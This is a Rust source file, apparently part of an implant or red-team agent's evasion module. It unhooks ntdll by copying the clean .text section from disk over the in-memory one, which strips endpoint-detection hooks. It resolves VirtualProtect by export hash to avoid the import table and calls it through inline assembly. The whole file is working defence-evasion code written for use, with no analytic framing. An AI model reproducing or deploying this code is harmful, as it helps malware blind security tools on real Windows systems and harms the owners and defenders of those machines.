// Ntdll unhook — mirror of Go agent/internal/win/unhook.go.
// Replaces the in-memory ntdll .text section with a fresh copy read from disk,
// removing EDR inline hooks. Uses resolved exports (no IAT).

#![cfg(target_os = "windows")]

use crate::evasion::pe::*;
use std::io::Read;

/// Replace the in-memory ntdll .text with the on-disk copy.
pub fn unhook_ntdll() -> Result<(), String> {
    unsafe {
        let ntdll = module_ntdll();
        if ntdll == 0 {
            return Err("ntdll not found".into());
        }
        let (nt, _) = match nt_headers_opt(ntdll) {
            Some(v) => v,
            None => return Err("invalid ntdll PE".into()),
        };
        let opt_size = (*nt).file_header.size_of_optional_header as usize;
        let n_sect = (*nt).file_header.number_of_sections as usize;
        let sect_base = (nt as usize) + 24 + opt_size;

        let root = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".into());
        let disk_path = format!("{}\\System32\\ntdll.dll", root);
        let mut disk = Vec::new();
        std::fs::File::open(&disk_path)
            .map_err(|e| format!("open {disk_path}: {e}"))?
            .read_to_end(&mut disk)
            .map_err(|e| format!("read {disk_path}: {e}"))?;

        if disk.len() < 2 || disk[0] != 0x4D || disk[1] != 0x5A {
            return Err("invalid on-disk ntdll".into());
        }
        // Map disk section RVAs → file offsets using the disk headers.
        let disk_dos = disk.as_ptr() as usize;
        let disk_lfanew = *(disk_dos as *const i32) as usize;
        let disk_nt = disk_dos + disk_lfanew;
        let disk_sect_base = disk_nt + 24 + (*(disk_nt as *const u16).add(2) as usize);

        for i in 0..n_sect {
            let sh = (sect_base + i * 40) as *const ImageSectionHeader;
            let name = &(*sh).name;
            if &name[..4] != b".tex" {
                continue;
            }
            let dsh = (disk_sect_base + i * 40) as *const ImageSectionHeader;
            let src_file_off = (*(dsh as *const ImageSectionHeader)).pointer_to_raw_data as usize;
            let src_size = (*(dsh as *const ImageSectionHeader)).size_of_raw_data as usize;
            if src_file_off == 0 || src_file_off + src_size > disk.len() {
                return Err("disk ntdll .text out of range".into());
            }
            let dst = ntdll + (*sh).virtual_address as usize;
            let dst_size = (*sh).virtual_size as usize;

            // Flip RW, copy, restore RX.
            let k32 = module_kernel32();
            let vp = get_export(k32, hash_ansi("VirtualProtect"));
            if vp == 0 {
                return Err("VirtualProtect unresolved".into());
            }
            let mut old = 0u32;
            call_vp(vp, dst, dst_size, PAGE_READWRITE, &mut old);
            let copy_size = src_size.min(dst_size);
            std::ptr::copy_nonoverlapping(disk.as_ptr().add(src_file_off), dst as *mut u8, copy_size);
            let mut old2 = 0u32;
            call_vp(vp, dst, dst_size, PAGE_EXECUTE_READ, &mut old2);
        }
        Ok(())
    }
}

unsafe fn call_vp(vp: usize, addr: usize, size: usize, protect: u32, old: &mut u32) {
    let ret: usize;
    core::arch::asm!(
        "mov r10, rcx",
        "call {vp}",
        vp = in(reg) vp,
        in("rcx") addr,
        in("rdx") size,
        in("r8") protect as usize,
        in("r9") old as *mut u32 as usize,
        lateout("rax") ret,
        options(nostack)
    );
    let _ = ret;
}

unsafe fn nt_headers_opt(base: usize) -> Option<(*const ImageNtHeaders64, usize)> {
    if base == 0 {
        return None;
    }
    let dos = base as *const ImageDosHeader;
    if (*dos).e_magic != 0x5A4D {
        return None;
    }
    let nt = (base + (*dos).e_lfanew as usize) as *const ImageNtHeaders64;
    if (*nt).signature != 0x0000_4550 {
        return None;
    }
    Some((nt, (*nt).optional_header.size_of_image as usize))
}
